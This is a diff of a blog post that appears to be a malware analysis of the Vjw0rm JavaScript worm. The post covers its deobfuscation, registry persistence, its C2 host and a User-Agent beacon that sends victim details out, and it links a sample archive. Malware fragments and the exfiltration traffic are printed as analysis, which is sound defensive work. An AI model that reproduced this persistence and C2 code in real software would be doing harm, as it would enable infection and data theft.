@@ -13,15 +13,15 @@ lastmod: '2020-02-01'
 draft: false
 ---
 
-I was monitoring `Any.Run` when a `.js` file peeked my interest due to the limited network traffic.
+I was monitoring __Any.Run__ when a __.js__ file peeked my interest due to the limited network traffic.
 
 # Analysis
 
 __Metadata:__
-- Name: `1.js`
-- MD5 : `3f438e857c45a4812dbfa331fd3b8011`
+- Name: __1.js__
+- MD5 : __3f438e857c45a4812dbfa331fd3b8011__
 
-The first stage decrypts a long Unicode string then calls `eval` on its result as seen in _Figure 1_.
+The first stage decrypts a long Unicode string then calls __eval__ on its result as seen in _Figure 1_.
 
 ```js
 function y(o,h) {
@@ -38,15 +38,15 @@ eval("eval(y(\"<long_unicode_string>\"");
 ```
 _Figure 1: Deobfuscation routine_
 
-When threat actor(s) use `eval`, most of the time I can easily bypass this with replacing it with `console.log` and using `nodejs` to do the heavy lifting for us.
+When threat actor(s) use __eval__, most of the time I can easily bypass this with replacing it with __console.log__ and using __nodejs__ to do the heavy lifting for us.
 
-In our case here this is exactily what I did with removing the sleep and replacing `eval` with `console.log`.
+In our case here this is exactily what I did with removing the sleep and replacing __eval__ with __console.log__.
 
 After the script is run with modifications it is possible to obtain the pseudo deobfuscated code.
 
 This means that the contents are still obfuscated to make it difficult for reading however we can identify some key functionality.
 
-In this case most of the strings are stored in an array with the variable `_0x4ba2`.
+In this case most of the strings are stored in an array with the variable ___0x4ba2__.
 
 This will have to be deobfuscated by hand as seen in _Figure 2_.
 
@@ -69,7 +69,7 @@ _Figure 2: Obfuscated result_
 
 To achieve this I renamed the variable and simplified the code so its easily human readable.
 
-`Vjw0rm` will first check for the registry key `HKCU\\vjw0rm` if the value is `TRUE` or `FALSE` to determine if the machine is already infected or not and will then run the `Install()` routine as seen in _Figure 3_.
+__Vjw0rm__ will first check for the registry key __HKCU\\vjw0rm__ if the value is __TRUE__ or __FALSE__ to determine if the machine is already infected or not and will then run the __Install()__ routine as seen in _Figure 3_.
 
 ```js
 try{
@@ -88,7 +88,7 @@ Install();
 ```
 _Figure 3: Check if installed_
 
-The install routine will copy the script to the `%TEMP%` directory then establish persistence by setting the registry key `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WEW2BF0U0A` with the value being the path to `vjw0rm` as seen in _Figure 4_.
+The install routine will copy the script to the __%TEMP%__ directory then establish persistence by setting the registry key __HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WEW2BF0U0A__ with the value being the path to __vjw0rm__ as seen in _Figure 4_.
 
 ```js
 function Install(){
@@ -107,9 +107,9 @@ function Install(){
 ```
 _Figure 4: Vjw0rm Persistence / Installation_
 
-After installation has completed it will send a HTTP POST request to the C2 server `updatefacebook.ddns.net:6`.
+After installation has completed it will send a HTTP POST request to the C2 server __updatefacebook.ddns.net:6__.
 
-Information of the victim machiine will be supplied to the C2 server by providing it in the `User-Agent` header.
+Information of the victim machiine will be supplied to the C2 server by providing it in the __User-Agent__ header.
 
 The traffic will look like the following:
 
@@ -119,13 +119,13 @@ Host: updatefacebook.ddns.net:6
 User-Agent: MR_ROBOT_18d0-EEF8\COMPUTER-NAME\USERNAME\caption\FullName\\TRUE\TRUE\
 ```
 
-The `User-Agent` contains the campaign prefix, drive id, computer-name, username, caption, full name, TRUE/FALSE (if visual basic compiler present), TRUE/FALSE (if Vjw0rm is installed).
+The __User-Agent__ contains the campaign prefix, drive id, computer-name, username, caption, full name, TRUE/FALSE (if visual basic compiler present), TRUE/FALSE (if Vjw0rm is installed).
 
-This variant has several command options, `Sc` (write file to disk and run it), `Ex` (run additional JSCript code), `Rn` (rename the UUID), `Up` (Run code w/ WScript), and `RF` (run file).
+This variant has several command options, __Sc__ (write file to disk and run it), __Ex__ (run additional JSCript code), __Rn__ (rename the UUID), __Up__ (Run code w/ WScript), and __RF__ (run file).
 
 Analysis files for this sample can be downloaded [here](/samples/2020-02-01-vjw0rm.zip).
 
-The password to all ZIP archives on this site is `infected`.
+The password to all ZIP archives on this site is __infected__.
 
 Thank you,
 
